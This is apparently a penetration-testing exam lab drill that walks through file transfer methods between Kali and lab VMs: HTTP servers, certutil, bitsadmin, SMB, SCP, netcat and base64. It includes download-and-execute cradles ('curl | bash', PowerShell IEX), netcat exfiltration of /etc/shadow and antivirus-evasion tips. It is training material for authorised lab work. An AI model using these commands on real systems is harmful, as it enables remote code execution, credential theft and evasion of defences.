# Lab: File Transfer Methods Drill

## Objective

Practice every file transfer method until they're muscle memory. On the OSCP, you'll transfer tools to targets and loot back to Kali constantly. Fumbling with transfers wastes exam time.

---

## Setup

Create a test file on Kali:
```bash
mkdir ~/transfer-lab && cd ~/transfer-lab
echo "TRANSFER_TEST_FILE — if you can read this, the transfer worked" > testfile.txt
cp /usr/bin/whoami test_binary
```

You'll practice transferring these to each VM and back.

---

## Method 1: Python HTTP Server + wget/curl

**The default method. Use this 90% of the time for Kali → Linux.**

```bash
# On Kali — serve files
cd ~/transfer-lab
python3 -m http.server 80
```

```bash
# On Debian/Ubuntu/CentOS — download
wget http://192.168.244.129/testfile.txt
cat testfile.txt

# Alternative
curl http://192.168.244.129/testfile.txt -o testfile.txt

# Download and execute without saving (for scripts)
curl http://192.168.244.129/testfile.txt | bash
```

**Verify:** Read the file on the target. Does it match?

**When this fails:**
- wget/curl not installed → try `fetch` (FreeBSD) or Python (see method 6)
- Port 80 blocked → use a different port: `python3 -m http.server 8888`
- Firewall → try port 443 or 53 (often allowed)

---

## Method 2: Python HTTP Server + certutil/PowerShell

**The default for Kali → Windows.**

```bash
# On Kali — serve files (same as above)
python3 -m http.server 80
```

```cmd
:: On Windows — certutil (works on every Windows version)
certutil -urlcache -f http://192.168.244.129/testfile.txt testfile.txt
type testfile.txt
```

```powershell
# On Windows — PowerShell
Invoke-WebRequest http://192.168.244.129/testfile.txt -OutFile testfile.txt
# Short form
iwr http://192.168.244.129/testfile.txt -o testfile.txt

# Download and execute in memory (scripts only — no file on disk)
IEX(New-Object Net.WebClient).DownloadString('http://192.168.244.129/testfile.txt')
```

**When certutil fails:**
- AV blocks it → try PowerShell
- PowerShell restricted → try `bitsadmin` (see below)
- Everything blocked → try SMB (method 3)

---

## Method 3: SMB Server (best for Windows targets)

```bash
# On Kali — start SMB server
impacket-smbserver share ~/transfer-lab -smb2support

# If Windows complains about authentication:
impacket-smbserver share ~/transfer-lab -smb2support -user test -password test
```

```cmd
:: On Windows — copy FROM Kali's share
copy \\192.168.244.129\share\testfile.txt C:\temp\

:: Copy TO Kali's share (exfiltration)
copy C:\Users\admin\Desktop\proof.txt \\192.168.244.129\share\

:: If authentication was set:
net use \\192.168.244.129\share /user:test test
copy \\192.168.244.129\share\testfile.txt C:\temp\
```

**Why SMB is great for Windows:**
- No additional tools needed on the target
- Works for both download AND upload
- Handles binary files correctly
- Familiar to Windows users

---

## Method 4: SCP (requires SSH)

```bash
# From Kali TO target
scp testfile.txt user@192.168.244.132:/tmp/
scp test_binary user@192.168.244.132:/tmp/

# From target TO Kali
scp user@192.168.244.132:/etc/passwd ./loot_passwd.txt

# Recursive (entire directory)
scp -r ~/transfer-lab user@192.168.244.132:/tmp/

# Non-standard SSH port
scp -P 2222 testfile.txt user@target:/tmp/

# Through a jump host
scp -J user@pivot testfile.txt user@internal:/tmp/
```

**When SCP is the right choice:**
- You already have SSH access
- Need to transfer in both directions
- Need to transfer large files (encrypted, reliable)

---

## Method 5: Netcat

```bash
# Receiver (on target)
nc -lvnp 9999 > received_file.txt

# Sender (on Kali)
nc 192.168.244.132 9999 < testfile.txt
```

```bash
# Reverse direction — target sends file to Kali
# On Kali (receiver)
nc -lvnp 9999 > loot.txt

# On target (sender)
nc 192.168.244.129 9999 < /etc/shadow
```

**Binary files:**
```bash
# Sender
nc TARGET 9999 < test_binary

# Receiver
nc -lvnp 9999 > received_binary
chmod +x received_binary

# Verify integrity
md5sum test_binary          # on sender
md5sum received_binary      # on receiver — should match
```

**When to use nc:** When nothing else is available. nc is on almost every Linux system.

---

## Method 6: Base64 (when nothing else works)

```bash
# On Kali — encode the file
base64 -w 0 testfile.txt
# Output: VFJBU0ZFUl9URVNUX0ZJTEU...
# Copy this entire string

# On target — decode
echo "VFJBU0ZFUl9URVNUX0ZJTEU..." | base64 -d > testfile.txt
```

**For binary files:**
```bash
# Encode on Kali
base64 -w 0 test_binary | xclip -selection clipboard
# Or just copy the output manually

# Decode on target
echo "BASE64_STRING" | base64 -d > test_binary
chmod +x test_binary

# Verify
md5sum test_binary    # compare with original
```

**When to use base64:**
- No network file transfer tools available
- Firewall blocks everything
- You only have a web shell or limited command execution
- The file is small (base64 is 33% larger — big files become huge strings)

---

## Method 7: Bitsadmin (Windows — when certutil is blocked)

```cmd
bitsadmin /transfer job /download /priority high http://192.168.244.129/testfile.txt C:\temp\testfile.txt
```

Slower than certutil but sometimes isn't blocked by AV.

---

## Method 8: PowerShell download cradles (multiple methods)

```powershell
# Method 1: Invoke-WebRequest (most common)
iwr http://192.168.244.129/testfile.txt -o testfile.txt

# Method 2: WebClient (older PowerShell)
(New-Object Net.WebClient).DownloadFile('http://192.168.244.129/testfile.txt','C:\temp\testfile.txt')

# Method 3: WebClient with proxy support
$wc = New-Object Net.WebClient
$wc.Proxy = [Net.WebRequest]::GetSystemWebProxy()
$wc.DownloadFile('http://192.168.244.129/testfile.txt','C:\temp\testfile.txt')

# Method 4: Download string (execute in memory)
IEX(New-Object Net.WebClient).DownloadString('http://192.168.244.129/script.ps1')
```

---

## Timed Challenge

Set a timer. Transfer a file to EACH VM and back using the fastest method.

```
□ Kali → Debian (wget):              Target: 30 seconds
□ Kali → CentOS (curl):              Target: 30 seconds
□ Kali → Ubuntu via CentOS (scp -J): Target: 60 seconds
□ Kali → Windows (certutil):         Target: 30 seconds
□ Kali → Windows (SMB):              Target: 45 seconds
□ Debian → Kali (nc):                Target: 30 seconds
□ Windows → Kali (SMB):              Target: 30 seconds
□ Base64 encode → paste → decode:    Target: 60 seconds

Total target: under 5 minutes for all 8 transfers
```

---

## Decision Tree

```
Kali → Linux target?
├── SSH available? → scp (easiest, encrypted)
├── wget/curl available? → python3 -m http.server + wget/curl
├── nc available? → netcat transfer
└── Nothing available? → base64 encode/decode

Kali → Windows target?
├── SMB works? → impacket-smbserver (most reliable)
├── HTTP works? → python3 -m http.server + certutil/PowerShell
└── Nothing works? → base64 through PowerShell

Target → Kali (exfiltration)?
├── SMB → copy file to \\KALI\share\
├── SCP → scp file user@KALI:/tmp/
├── NC → nc KALI PORT < file
└── Base64 → encode, copy, decode on Kali
```

---

## Cleanup

```bash
rm -rf ~/transfer-lab
```
